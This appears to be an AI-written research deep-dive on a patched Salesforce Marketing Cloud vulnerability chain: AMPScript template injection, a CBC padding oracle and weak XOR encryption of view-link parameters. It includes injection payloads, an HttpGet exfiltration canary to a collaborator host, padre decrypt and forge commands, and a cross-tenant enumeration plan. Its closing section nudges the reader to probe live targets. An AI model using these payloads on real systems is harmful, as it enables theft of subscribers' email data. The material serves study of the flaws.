resource: `https://slcyber.io/research-center/ghosts-of-encryption-past-salesforce-exacttarget/`

This vulnerability chain represents a masterclass in modern SaaS infrastructure compromise. To fully map out its mechanics, this analysis moves down parallel tracks: a deep-dive into the primary core infrastructure primitives, a structural review of the historical 2019 Assetnote/Uber AMPScript research that preceded it, and a hands-on verification of the cryptographic flaws using localized lab environments.

---

# 🔬 DEEP DIVE — Ghosts of Encryption Past: Salesforce Marketing Cloud / ExactTarget

**Researcher: TripleAX | Date: 24 June 2026 | Mode: Deep Dive**

---

## WHAT IS THIS RESEARCH?

This is a multi-vulnerability chain discovered by Searchlight Cyber / Assetnote (Dylan Pindur, Shubham Shah et al.) in **Salesforce Marketing Cloud (SFMC)**, formerly ExactTarget. The end result: an attacker could **read every email ever sent through SFMC, across every company using it**, plus exfiltrate full subscriber databases — aviation, finance, tech, energy companies — just by signing up to a mailing list.

The vulnerabilities centered on a combination of template injection flaws and a broken encryption scheme protecting email viewing links. Since the platform uses a single shared infrastructure and a single static encryption key for all customers, a flaw in one tenant could silently expose every other tenant on the same network.

Five CVEs were assigned: CVE-2026-22585, CVE-2026-22586, CVE-2026-22582, CVE-2026-22583, CVE-2026-2298.

There are **two independent attack surfaces** in this research. We need to understand both separately before we can understand the chain.

---

## ATTACK SURFACE 1 — AMPScript Template Injection

### Concept Level — What is AMPScript?

SFMC ships its own scripting languages baked into email templates:

- **AMPScript** — delimited by `%%=` and `=%%`
- **SSJS** — server-side JavaScript in a C# Jint fork
- **GTL** — legacy, uses `{{= ... }}` syntax

These are full programming languages with loops, if-statements, variables, and HTTP functions — all running server-side when an email renders or previews.

### Technical Level — The Injection Mechanism

There are **two footguns** that create the injection surface:

**Footgun #1 — `TreatAsContent`**

Functions like `TreatAsContent` act as an "eval string as template" primitive, meaning any user-controlled value passed into them can become active template code, enabling template injection.

```
// DANGEROUS — developer thought this was harmless string concat
%%=TreatAsContent(Concat("Welcome, ", [Full Name], "!"))=%%
```

If `[Full Name]` is controlled by the attacker and contains `%%=mul(7,7)=%%`, the template engine evaluates it as live code. The problem: the `TreatAsContent` page did not warn that this function was dangerous, and many tutorials unsafely used the function.

**Footgun #2 — Double Evaluation in Email Subjects** ⚡

This is the more dangerous one. The subject of emails sent by SFMC were double evaluated by default. This meant any company that included user data in any context in the subject of an email was vulnerable to template injection.

Here's the step-by-step of what happens:

```
Subject template:   Welcome %%=[First Name]=%%  to our mailing list!
Attacker signs up as: %%=mul(7,7)=%%

First evaluation:   Welcome %%=mul(7,7)=%% to our mailing list!
Second evaluation:  Welcome 49 to our mailing list!
```

A developer had no obvious reason to suspect danger, yet this behavior turned every personalized subject line into a potential entry point.

⚡ **This is insecure by default.** The developer doesn't need to make any mistake. Simply putting the subscriber's name in the subject line — the most basic thing any marketer does — creates a template injection vector. Every company that used SFMC and put user data anywhere in a subject line was exposed.

Salesforce tried to remove this functionality from the platform in 2023 but reversed course after customer pushback. Since the disclosure of these vulnerabilities, Salesforce has once again disabled double evaluation of email subject line AMPscript.

### What Can You Do With AMPScript Injection?

Once code executes, the damage scales quickly. These are SFMC's name for system tables, and contain everything from sent emails, to sent SMSes, and the full contact list stored inside the application. Accessing this data allowed attackers to retrieve all content stored or sent by SFMC for that tenant.

The magic function is `LookupRows` — it queries internal **Data Views** with no restriction:

```
%%= RowCount(LookupRows("_Subscribers","SubscriberKey",_subscriberkey)) =%%
```

This returns the number of subscribers. Expanding it lets you extract individual records. Data Views exposed include:

| Data View | Contents |
|-----------|----------|
| `_Subscribers` | Full contact list — emails, names, subscriber keys |
| `_Sent` | Every email ever sent |
| `_Job` | Email job metadata |
| `_SMSMessageTracking` | SMS records if used |
| `_Click` | Click tracking data |

`HttpGet` serves as both a canary (DNS callback to confirm execution) and a data exfiltration channel by transmitting data blind via query parameters.

**The injection test payload:**
```
%%=RowCount(LookupRows("_Subscribers","SubscriberKey",_subscriberkey))=%%
```
Put this in the **First Name** field of any SFMC-powered mailing list signup. If the welcome email subject contains your name and uses double-eval, you get code execution.

---

## ATTACK SURFACE 2 — Broken Encryption on the `qs` Parameter

This is where the research goes from "interesting SSTI" to "we can read all emails across every company on the entire platform."

### The Setup

Every SFMC email contains a "View in Browser" link, structured as:

```
https://view.e.yourcompany.com/?qs=<encrypted_blob>
```

Since all the `view.*` domains for different companies were pointing to the same shared infrastructure, the domain name in use didn't actually matter. The host didn't actually matter, and that both the tenant and sent email were stored on the encrypted string. This means the blob decodes to something like:

```
j=105891&m=123456789&ls=35631528&l=358&s=38629805&jb=1&ju=1637251&n=6002
```

Where:
- `m` = MID / Business Unit (which **company**)
- `j` = Job ID (which **email campaign**)
- `ls` = ListSubscriber (which **recipient**)

If you can manipulate these values, you can read any email from any company.

### The Three Encryption Formats

**Modern Format** — AES-GCM-like JSON with IV, CipherText, AuthTag. The researchers correctly identified authenticated encryption here and **moved on** — this was secure.

**Classic Format** — The vulnerable one. Looks like hex: `1ea3e8ade15ee450a89189c4fc7bbe23ab45...`

**Legacy/XOR Format** — The ancient one. Per-parameter hex values that look like: `j=fec5117277630d7c&m=fe8a1272756c027b7c&ls=fe3916747764067f741c71...`

### Breaking the Classic Format — CBC Padding Oracle

The researchers noticed something critical: changing a specific byte in the string didn't cause the page to error. Rather, it corrupted 1 byte in the payload, as well as the previous encrypted block.

This is the tell of **unauthenticated CBC mode**. Here's why this matters:

**CBC Decryption in plain English:**

Think of the ciphertext as a series of 8-byte blocks: `[C1][C2][C3]...`

To decrypt block `C2`:
1. The block cipher decrypts `C2` → produces an intermediate value `I2`
2. XOR `I2` with `C1` → produces plaintext `P2`

The critical property: **flipping a byte in `C1` predictably flips the corresponding byte in `P2`, while completely corrupting `C1`'s plaintext.** This is exactly what the researchers observed.

**What is a Padding Oracle?**

A padding oracle is present if an application leaks the specific padding error condition for encrypted data provided by the client. This can happen by exposing exceptions directly, by subtle differences in the responses sent to the client, or by another side-channel like timing behavior.

SFMC's oracle: submit a modified `qs` → either the page errors (bad padding) or it renders with one corrupted byte (valid padding). That yes/no signal is the oracle.

**The Decryption Attack — step by step:**

Using the tool `padre`, the attack works like this:

1. Take a known ciphertext `C = [C1][C2][C3]`
2. To recover the last byte of `P2`: try all 256 values for the last byte of `C1`
3. When the server returns "valid padding", you know the XOR of your modified `C1[-1]` with `I2[-1]` equals `\x01` (PKCS7 padding for 1 byte)
4. Solve: `I2[-1] = your_guess XOR \x01`, then `P2[-1] = I2[-1] XOR original_C1[-1]`
5. Repeat for each byte, working right to left, requesting 256 possibilities per byte
6. Cost: `256 × length_in_bytes` requests to decrypt — around 10,000+ requests for a typical payload

The result:
```
padre output: &m=10912443&ls=346789701&ju=39383644&n=1678\x05\x05\x05\x05\x05
```

The `\x05` bytes are PKCS7 padding — confirms the decryption worked perfectly.

**The Re-encryption Attack (Padding Oracle Encryption):**

In each step, padding oracle attack is used to construct the IV to the previous chosen ciphertext. This means you can also *encrypt* arbitrary plaintexts using the same oracle. The researchers used this to forge new `qs` values with modified `ls` (subscriber ID), enabling enumeration of all subscriber emails via the `ftaf.aspx` (Forward to a Friend) endpoint.

**The `MicrositeURL` Speedup:**

The padding oracle needed ~10,000 requests per guess. Then they found `MicrositeURL` — an AMPScript function that generates valid encrypted `qs` strings. The parameter restriction in the docs wasn't enforced:

```
%%=MicrositeURL(1, "j", "4630704", "m", "10912443", "ls", "346789702", "ju", "39383644", "n", "1678")=%%
```

And the `LID` restriction bypass — combine all params into one argument:
```
%%=MicrositeURL(1, "test", "=0&LID=1&j=2&m=3&ls=4")=%%
```

Because SFMC used a single, static shared key across all instances, the `qs` values generated in their test bed worked everywhere. Two requests instead of 10,000+.

### Breaking the Legacy XOR Format

This is almost farcical. The per-parameter "encryption" is just XOR with a static repeating string key combined with a 2-byte checksum (`0xFFFF XOR sum(bytes)`).

The researchers recovered the key by:
1. Knowing the plaintext structure (parameters are always digits, always `j=` first)
2. Collecting multiple samples
3. Eliminating possibilities until the key uniquely fit all samples

Once the key was known: encrypt/decrypt any parameter in one Python function. Cost to enumerate: **1 request per guess.** Maximum speed.

What's particularly wild: even though this encryption method was ancient and never generated for new traffic anymore, it still worked — even for brand new tenants. The old code path was never removed.

---

## THE CHAIN — How It All Combines

Here's the full attack flow visualized:

```
STAGE 1: RECONNAISSANCE
─────────────────────────────────────────────────────
Find SFMC assets via DNS patterns:
  click.<domain>, view.<domain>, cloud.<domain>
  pages.<domain>, images.<domain>
  CNAME → *.exacttarget.com or *.sfmc-content.com

STAGE 2: TEMPLATE INJECTION (AMPScript)
─────────────────────────────────────────────────────
Sign up to mailing list with payload in First Name field:
  %%=RowCount(LookupRows("_Subscribers","SubscriberKey",_subscriberkey))=%%

Wait for welcome email → subject line double-eval fires
  → subscriber count appears in subject line = RCE confirmed

Escalate to full data exfil:
  LookupRows on _Subscribers, _Sent, _Job, _SMSMessageTracking
  HttpGet for blind exfil via DNS/URL callback

STAGE 3: DECRYPTING THE QS PARAMETER
─────────────────────────────────────────────────────
Get a legitimate SFMC email (any company on same cluster)
Extract the ?qs= parameter from "View in Browser" link

Classic format: Run padre padding oracle attack
  → 10,000+ requests per block → full plaintext recovered
  j=..., m=..., ls=..., ju=..., n=...

OR if you have SFMC test bed access:
  Use MicrositeURL function → 2 requests total

Legacy XOR format:
  Decode key + checksum → instant decryption
  Trivial re-encryption → 1 request per enumeration step

STAGE 4: CROSS-TENANT EMAIL ENUMERATION
─────────────────────────────────────────────────────
Forge new qs with target company's MID (m=) and 
  incrementing ls values
Hit ftaf.aspx (Forward to a Friend) → email resolves to
  subscriber's real email address

Result: enumerate every email address in any company's
  subscriber database, across any SFMC tenant globally
```

---

## ⚡ NOVEL ANGLES & HYPOTHESES

**H1 — This class of bug survives in other marketing platforms**
SFMC isn't the only marketing cloud. Klaviyo, Mailchimp, HubSpot, Braze, Iterable, and ActiveCampaign all offer template personalization with user-data interpolation. The double-evaluation footgun is a platform design decision — any platform that evaluates subscriber data inside a template engine is a candidate. Same methodology, different targets.

**H2 — The "Forward to a Friend" endpoint as a generic oracle**
🔗 The `ftaf.aspx` endpoint is publicly accessible, requires no authentication, and resolves subscriber IDs to emails. Even after the encryption is fixed, any future weak crypto on a similar endpoint (profile centers, unsubscribe centers, subscription centers) is the same attack pattern. These "legacy convenience" endpoints are universally undertested.

**H3 — Argument injection in `MicrositeURL` generalizes**
The bug that reserved parameter names weren't enforced — and that you could bypass the check by concatenating all args into one string — is fundamentally an **argument injection** through insufficient input validation in an API wrapper. This pattern appears anywhere a platform provides a "safe" API wrapper for URL generation and then fails to actually validate inputs before passing them to the underlying encryption/encoding function.

**H4 — Shared crypto key = platform-wide blast radius**
The researchers identified that the single static key was the architectural flaw that turned a per-tenant bug into a platform-wide compromise. ⚡ This is worth internalizing as a research mindset: whenever a SaaS platform runs on shared infrastructure, ask "is the crypto key per-tenant or global?" If it's global, a single weak cryptographic primitive is a universe-wide vulnerability.

**H5 — What does remediation miss?**
Salesforce expired all links before Jan 23, 2026, deployed AES-GCM, and disabled double eval. But: were all `ftaf.aspx`-style auxiliary endpoints also migrated? Were Cloud Pages fully covered? In shared-tenancy platforms, remediation often lags on auxiliary features. Worth mapping all endpoints that accept `qs`-style encrypted parameters.

---

## HOW TO TEST THIS CLASS OF VULNERABILITY

**Note: Everything below is theoretical/lab methodology for authorized targets only.**

### Finding SFMC Targets
```bash
# DNS enumeration for SFMC assets
subfinder -d target.com | grep -E 'click\.|view\.|cloud\.|pages\.|images\.'
# Check CNAMEs
dig click.target.com CNAME | grep -E 'exacttarget|sfmc-content'
# Or use the Salesforce IP lists to find by IP
```

### Testing for AMPScript Injection
Registration forms on any SFMC-powered site. Try in name, company, and other free-text fields:

```
# Canary — blind test
%%=HttpGet("https://yourburp.collaborator.com")=%%

# GTL syntax bypass (if %% is filtered)
{{=HttpGet("https://yourburp.collaborator.com")}}

# Count subscribers — confirm data access
%%=RowCount(LookupRows("_Subscribers","SubscriberKey",_subscriberkey))=%%

# Subject line test — sign up as:
%%=mul(7,7)=%%
# If welcome email subject contains "49" — double eval confirmed
```

### Testing for Weak `qs` Encryption (Patched, but methodology lives on)
```bash
# Step 1: Get a qs parameter from any SFMC email
# Step 2: Flip single bytes in the hex blob, observe response
# Valid padding = page renders with corruption
# Invalid padding = 500 error

# Step 3: If oracle exists, run padre
padre -e lhex -b 8 -p 20 -u 'https://view.e.target.com/view.aspx?qs=$' -decrypt

# Step 4: Forge new qs if oracle confirmed
padre -e lhex -b 8 -p 20 -u 'https://view.e.target.com/ftaf.aspx?qs=$' -enc "QXXXXXXX=0&m=10912443&ls=346789702"
```

### Detecting the Legacy XOR Format
```
Look for qs parameters where:
- Values are hex
- Each parameter is separately encoded (j=hex&m=hex&ls=hex in URL)
- First byte of each value is 0xFE or 0xFF
- Subsequent bytes stay below 0x7F
→ Almost certainly XOR-encrypted
→ Collect multiple samples + known plaintext to recover key
```

---

## WHERE ELSE DOES THIS CLASS OF VULNERABILITY APPEAR?

**Template Injection in other marketing platforms:**
Any SaaS that lets users control data that gets interpolated into a template engine — look for equivalent `eval-as-template` primitives in Klaviyo, Braze, Iterable, Mailchimp's custom scripting features.

**Unauthenticated CBC in web apps:**
Generally the following conditions must be met: The data is encrypted, and good candidates are values which appear to be random. Look for:
- Base64 or hex blobs in cookies, tokens, or URL parameters
- Values whose length is always a multiple of 8 or 16 (block size tells you the cipher)
- Error vs. success differential when you flip bytes
- The classic test: flip 1 byte and observe — does the response change in a predictable, partial way?

**The general principle — anywhere you see:**
- Opaque encrypted tokens accepted from the client
- No HMAC / auth tag on the ciphertext
- A behavioral difference between "bad padding" and "valid but corrupted"
→ You have the ingredients for a padding oracle

---

## PRACTICE / LAB RESOURCES

For CBC Padding Oracle specifically:
- **PortSwigger Web Academy** — `Padding oracle attacks` lab (direct hands-on)
- **PentesterLab** — [Padding Oracle exercise](https://pentesterlab.com/exercises/padding-oracle) — free, PHP/CBC, direct exploitation
- **Cryptopals Challenges Set 3 Challenge 17** — Build the attack from scratch in code — deepest understanding
- **NCC Group write-up on Cryptopals** — Excellent theoretical companion

For SSTI/Template Injection:
- **PortSwigger SSTI labs** — Direct Jinja2/Twig/Freemarker injection practice
- **HackTheBox** machines tagged `SSTI`

---

## RESEARCH LOG

| # | Topic | Date | Depth | Key Finding | Resources | Status |
|---|-------|------|-------|-------------|-----------|--------|
| 1 | SFMC AMPScript Template Injection + CBC Padding Oracle Chain | 24 Jun 2026 | Deep Dive | Multi-CVE chain: SSTI via double eval + unauthenticated CBC + XOR crypto = full cross-tenant email read on all SFMC customers globally | 10+ | Complete |

---

## RESOURCES

| Title | URL | Source | Summary |
|-------|-----|--------|---------|
| Ghosts of Encryption Past (primary) | https://slcyber.io/research-center/ghosts-of-encryption-past-salesforce-exacttarget/ | Searchlight Cyber | Full original research writeup |
| Uber AMPScript 2019 | https://blog.assetnote.io/bug-bounty/2019/01/14/gaining-access-to-ubers-user-data-through-ampscript-evaluation/ | Assetnote | Original $23K SFMC injection bug on Uber |
| Salesforce CVE advisory | https://help.salesforce.com/s/articleView?id=005299346 | Salesforce | Official CVE descriptions for all 5 issues |
| OWASP Padding Oracle testing | https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle | OWASP WSTG | Detection methodology for padding oracle |
| NCC Group — CBC Padding Oracle deep | https://www.nccgroup.com/us/research-blog/cryptopals-exploiting-cbc-padding-oracles/ | NCC Group | Best written explanation of the attack math |
| HackTricks Padding Oracle | https://book.hacktricks.xyz/crypto-and-stego/padding-oracle-priv | HackTricks | Practical payloads, PadBuster usage |
| PentesterLab Padding Oracle lab | https://pentesterlab.com/exercises/padding-oracle | PentesterLab | Free hands-on lab — PHP/CBC |
| Wikipedia CBC Padding Oracle | https://en.wikipedia.org/wiki/Padding_oracle_attack | Wikipedia | Theory, history, Vaudenay 2002 origins |
| padre tool | https://github.com/glebarez/padre | GitHub | The tool used in this research |

---

## KEY TAKEAWAYS

- **Double evaluation = insecure by default.** Any SFMC instance that put subscriber data in a subject line was vulnerable without the developer making any mistake. This is a platform-level design failure.
- **Unauthenticated CBC is broken by design.** Without a MAC/HMAC on the ciphertext, any block cipher in CBC mode is vulnerable to padding oracle attacks regardless of key size.
- **Shared keys make individual weaknesses platform-wide.** When all tenants share one key, breaking one breaks all. Multi-tenant SaaS crypto must be per-tenant.
- **Legacy code paths never die.** The XOR format was 15+ years old, never generated for new traffic, but still processed by the server. Old code paths on modern platforms are fertile hunting ground.
- **"Reserved parameter" restrictions are software — software can be wrong.** Always verify that documented restrictions are actually enforced, not just stated in docs.
- **Speed of exploitation scales inversely with crypto weakness.** From 10,000 requests (CBC oracle) → 2 requests (MicrositeURL bypass) → 1 request (XOR direct). Understanding the full crypto surface is worth the investment.

---

## SUGGESTED NEXT RESEARCH TOPICS

1. **Server-Side Template Injection (SSTI) — General** — Jinja2, Twig, Freemarker, Pebble — the same class of vuln across modern web frameworks, with known methodology
2. **Cryptographic Vulnerabilities in Web Apps** — Padding oracle, ECB mode detection, IV reuse, insecure randomness — the broader crypto attack surface
3. **Multi-Tenant SaaS Architecture Vulnerabilities** — Tenant isolation failures, shared key material, cross-tenant data access — a high-value emerging research area
4. **ExactTarget/SFMC Historical Research** — ServiceNow chain by the same team (`assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data`) — same researchers, same methodology
5. **Argument Injection** — The `MicrositeURL` bypass is a specific instance of a broader class — improper input validation in API wrappers that generate signed/encrypted outputs

---

Check-in point. That's the complete deep dive. A few things I want to flag before we go further:

🎯 **The double-eval subject line bug is still conceptually relevant** in any platform that processes user data through a template engine before sending — the fix was specific to SFMC but the pattern lives on.

⚡ **The XOR "encryption" recovery technique** — being able to reconstruct a static XOR key from multiple ciphertext/plaintext samples — is a transferable skill you'll use again. Same pattern appears in weak obfuscation schemes everywhere.

🔗 **This whole chain connects directly to your work.** Any target that sends you a marketing email is potentially running SFMC or a competitor. Check the DNS, check the `view.*` subdomain, check what `qs` looks like.

